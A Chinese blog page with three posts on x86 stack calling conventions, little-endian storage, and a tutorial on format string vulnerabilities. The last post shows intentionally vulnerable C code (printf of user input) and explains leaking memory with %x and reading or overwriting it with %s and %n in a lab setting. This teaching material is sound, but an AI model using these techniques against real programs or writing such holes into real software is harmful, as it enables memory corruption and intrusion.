</code></pre><p>执行完上面代码，堆栈图差不多就是这个样子，（该图，下面是高址，上面是低址）<br>中间的ccc….就是填充缓冲区。填充后可以用来写入局部变量。<br>EBP后面的高址，存有恢复用的EIP，和call函数前push的参数。<br>EBP前面的低址，用来存局部变量。</p>
<p><img src="/2019/02/11/x86汇编-函数调用/1.png" alt=""></p>
<hr>
<p>根据函数调用约定的不同，平衡堆栈的方式不同<br>如果是__cedcl约定，是在母函数中平衡堆栈，就是函数调用完返回后，在调用者的函数体内 add esp，xx 来平衡堆栈。<br>例如母函数体内：<br> <code>push xx
 call 子函数
 add esp,0x4</code></p>
<p>有几种函数调用约定，不同的调用约定，参数的传递，堆栈的平衡方式不同。下面是三种常见的调用约定：<br><strong>__cedcl 约定</strong><br>参数从右往左，依次入栈。堆栈平衡在母函数中完成。<br>在函数调用前，将参数压栈。<br><code>push xxx
push xxx
...
然后call 函数。
//函数执行完毕
add esp ，xx
//在母函数中平衡堆栈</code></p>
<p><strong>stdcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈。<br>参数还是在调用前push 入栈。<br>平衡堆栈时，在 子函数 ret 后加个 xx  恢复堆栈<br>例如 ret   0x8，相当于 pop eip     add esp，0x8 </p>
<p><strong>fastcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈<br>参数1个或者两个用 寄存器 传参，多于两个，多余两个的部分还是压栈传参。<br>例如  func(int a,int b,int c)<br><code>push c
mov eax,b
mov ecx,a</code><br>然后再call 函数，最后在子函数中平衡堆栈。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/11/深入理解little-endian/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/11/深入理解little-endian/" itemprop="url">深入理解little-endian</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-11T16:59:32+08:00">
                2019-02-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  567
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>little-endian 简单来说即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。</p>
<p>首先，明确一点，最小的单元都是字节；数据在内存中的存放是以字节为单位的。字节内的内容<strong>没有</strong>所谓的高位高址，低位低址。</p>
<p>在内存中存放数据时，先将这个数据拆分为一个一个的字节。再将高位字节放在高址，低位字节放低址。</p>
<p>要注意内存数据（数据在内存中实际位置）和 数值数据（实际应用的数值）的区别。真实内存中数据的存放是高位放高址，低位放低址。 而变为数值数据时是从高位到低位连起来的，例如 原本数据是int a=0x12345678，而实际放在内存中是  78 56 34 12 ，将其作为数值应用时，要将高位从低位连起来。更直观点是这样的。</p>
<p><img src="/2019/02/11/深入理解little-endian/1.png" alt=""></p>
<p>再来看看数值数据是如何转变的。</p>
<p><img src="/2019/02/11/深入理解little-endian/2.png" alt=""></p>
<p>内存中真实存储情况是这样的，但是应用为数据时（即这一格代表的数是多少）要从高址到低址读，即EBP-4这一格代表的数据是12345678。<br>在一些调试器上，例如ollydbg中，显示一格对应的数据时，一般已经转化为应用数据了（例如OD的堆栈窗口），而不是内存中的真实存储情况，这一点要清楚。</p>
<p>还需要清楚知道的是little-endian的存放机制的对象是<strong>单个元素的数值在内存的存放</strong>。 <em>对数组的元素的存放需要区别。</em></p>
<p><strong>数组的寻址公式是 ：首元素的地址+ n * 数组单个元素所占字节数。
</strong>所以数组的存放是高位的<strong>元素</strong>在低址，低位的<strong>元素</strong>在高址。这里要和单个元素的存放区别开。<br>例如 char a[5]=”abcde”;<br>则元素在内存中的存储是</p>
<p><img src="/2019/02/11/深入理解little-endian/3.png" alt=""></p>
<p>再例如 int a[3]={0xaabbccdd,0xbbccddee,0xccddeeff};<br>则在内存中存储是</p>
<p><img src="/2019/02/11/深入理解little-endian/4.png" alt=""></p>
<p>这两个例子中都是真实存储情况，不是应用数值。<br>后者这个例子中，每个元素的存储方式还是按照little-endian的方式存储。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/11/基本格式化字符串漏洞原理/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/11/基本格式化字符串漏洞原理/" itemprop="url">基本格式化字符串漏洞原理</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-11T16:42:00+08:00">
                2019-02-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.8k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>理解这个漏洞的原理，你需要有汇编层面的函数调用和函数的参数传递知识。如果你不清楚函数的参数是如何传递的，可以看《加密与解密》的逆向分析技术篇。</p>
<p>再说格式化字符串漏洞之前，先了解一下printf函数和利用该漏洞的重要 格式化字符串%n，利用他可以做到几乎任意内存写入。</p>
<h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><p>int printf (“格式化字符串”,参量… )<br>函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。<br>参量表中参数的个数是不定的（<em>如何实现参数的个数不定，可以参考《程序员的自我修养》这本书</em>），可以是一个，可以是两个，三个…..，<strong>也可以没有参数</strong>。<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。<br>但是有个不常见的格式化字符串 <strong>%n</strong> ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。</p>
<p><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是指针指向的地方开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟 程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，地址的长度是不同的。</p>
<p>具体实例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/1.png" alt=""></p>
<p>%n之前打印了5个a，所以n的值变成了5。</p>
<p>了解了这些后就可以说下格式化字符串漏洞了。</p>
<h3 id="漏洞成因和基本原理"><a href="#漏洞成因和基本原理" class="headerlink" title="漏洞成因和基本原理"></a>漏洞成因和基本原理</h3><p>正确使用printf是这样的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但也有人会懒省事，写成这样：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[]=<span class="string">"neuqcsa"</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实参与函数形参的结合顺序是从左往右依次进行的，所以上面的代码也能输出：</p>
<p><img src="/2019/02/11/基本格式化字符串漏洞原理/2.png" alt=""></p>
<p>上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果用户输入的字符串是”%x%x%x”，则会输出以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/3.png" alt=""></p>
<p>输出的结果是 内存中的数据。</p>
<p>看一下调用printf函数后的堆栈图：（cdecl调用方式，参数从右往左依次入栈）</p>
<p><img src="/2019/02/11/基本格式化字符串漏洞原理/4.png" alt=""></p>
<p>在OD中可以清晰的看到：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/5.png" alt=""></p>
<p><strong>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。</strong></p>
<p>所以尽管没有参数，上面的代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p>
<h3 id="任意内存的读取及任意内存写入："><a href="#任意内存的读取及任意内存写入：" class="headerlink" title="任意内存的读取及任意内存写入："></a>任意内存的读取及任意内存写入：</h3><p> 任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。</p>
<p>在说任意内存的读取之前要知道 <strong>局部变量是存储在栈中</strong>，这点很关键。所以一定可以找到我们所输入的格式化字符串。<br>例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以得到以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/6.png" alt=""></p>
<p>看下堆栈图：<br>这是调用scanf函数前的堆栈图。</p>
<p><img src="/2019/02/11/基本格式化字符串漏洞原理/7.png" alt=""></p>
<p>输入字符串后的堆栈图：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/8.png" alt=""></p>
<p>调用printf函数的过程：</p>
<pre><code>mov eax，数组首地址
push eax  
call printf
</code></pre><p>该过程只是将数组的首地址入栈，此时堆栈图如下。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/9.png" alt=""><br>所以在格式化字符串里用很多的%x 就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p>
<p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br>%&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.</p>
<p><img src="/2019/02/11/基本格式化字符串漏洞原理/10.png" alt=""></p>
<p>图中是第六个参数是41414141。</p>
<p><img src="/2019/02/11/基本格式化字符串漏洞原理/11.png" alt=""></p>
<p>同样可以得到41414141。这样就方便的多了。</p>
<h4 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h4><p>有了上面内容的铺垫就可以学任意读取了：<br>看下面的代码：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/12.png" alt=""></p>
<p>从命令行输入字符串后，将该字符串复制到a内，再直接打印a；<br>输入的字符串的前4个字节如果是一个有效的字符串的首地址，就可以用%s将其打印出来，做到任意内存读取。如果不是有效的字符串，会出现段错误。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/13.png" alt=""></p>
<p><strong>如何写入地址，需要用到linux自带的printf命令，将shellcode编码转义为字符</strong>。（注意用反引号将printf命令括住，反引号在Tab键的上面，反引号内的内容会被当做命令执行。）<br><strong>如果是用scanf输入字符串，则无法使用printf命令，只能对照ascii码表，scanf和命令行输入的shellcode编码不能直接被转义。（所以为了方便演示，后面都使用了命令行输入参数）</strong><br>写入地址实例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/14.png" alt=""></p>
<p>0x41414141这个地址已经成功写入内存，下面只需用%s读取对应位置，就能读取以0x41414141为首地址的字符串。<br>如果用%n就能将0x41414141这个地址指向的值修改，就能造成任意内存的修改，可以将栈中返回地址修改为想要执行的shellcode的首地址等等。</p>
<h4 id="修改内存"><a href="#修改内存" class="headerlink" title="修改内存"></a>修改内存</h4><p>下面写个修改静态变量的例子<br>例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/15.png" alt=""></p>
<p>测试前，请先关闭内存地址随机化（PIE），否者b在内存中的地址是不确定的。<br>先运行下，得到b的地址<br><img src="/2019/02/11/基本格式化字符串漏洞原理/16.png" alt=""></p>
<p>接着确定偏移量<br><img src="/2019/02/11/基本格式化字符串漏洞原理/17.png" alt=""></p>
<p>这里是第九个参数。<br>接着用shellcode编码将b的地址写入，并查看能否写入成功。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/18.png" alt=""><br>用%n修改其值。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/19.png" alt=""><br>因为%n之前打印了75个字符，所以这里将b的值从0修改为75<br><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。注意在命令行输入字符串参数时，要用 “ \ “将 $ 转义，例如：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/20.png" alt=""></p>
<p>在%n之前打印了4个字符，所以b的值直接被修改为4了。<br>你可以通过控制打印的字符个数来修改b的值，达到几乎任意修改。<br>例如%0xxxxxd，通过打印数字前面补0，进行简化。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/my.jpg" alt="ditto">
            
              <p class="site-author-name" itemprop="name">ditto</p>
              <p class="site-description motion-element" itemprop="description">pwn for fun</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ditto</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">21.9k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
